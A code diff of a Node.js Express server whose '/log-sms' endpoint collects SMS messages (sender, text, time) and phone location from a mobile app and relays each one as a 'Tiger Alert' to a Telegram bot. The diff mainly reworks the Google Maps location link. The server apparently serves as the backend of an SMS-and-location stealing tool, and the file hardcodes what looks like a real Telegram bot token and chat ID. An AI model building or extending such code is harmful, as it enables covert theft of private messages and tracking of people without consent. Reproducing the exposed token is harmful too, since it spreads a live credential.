@@ -9,7 +9,7 @@ app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
 // --- CONFIGURATION ---
-// Naya token BotFather se lekar yahan dalein
+// Naya token aur ID
 const BOT_TOKEN = '8394719862:AAGdG06eMVj_Mz4hFCqv-jHrmyiSqsDXppk'; 
 const CHAT_ID = '7128071523';
 // ---------------------
@@ -30,14 +30,16 @@ app.post('/log-sms', async (req, res) => {
             sender: sender || 'Unknown',
             message: message || 'No Content',
             time: timestamp || new Date().toLocaleString(),
-            location: location || null
+            location: location || "Disabled"
         };
 
         smsLogs.unshift(newEntry);
         if (smsLogs.length > 200) smsLogs.pop();
 
-        // Google Maps Link (Agar location aayi hai)
-        const mapUrl = location ? `\n📍 Location: https://www.google.com/maps?q=${location.latitude},${location.longitude}` : '';
+        // ✅ Correct Map URL Logic: Mobile app se "lat,long" string aati hai
+        const mapUrl = (newEntry.location !== "Disabled") 
+            ? `\n📍 Location: https://www.google.com/maps?q=${newEntry.location}` 
+            : '\n📍 Location: Not Available';
 
         const telegramMsg = `🐯 *Tiger Alert!*\n\n` +
                           `📱 *Device:* ${newEntry.device}\n` +
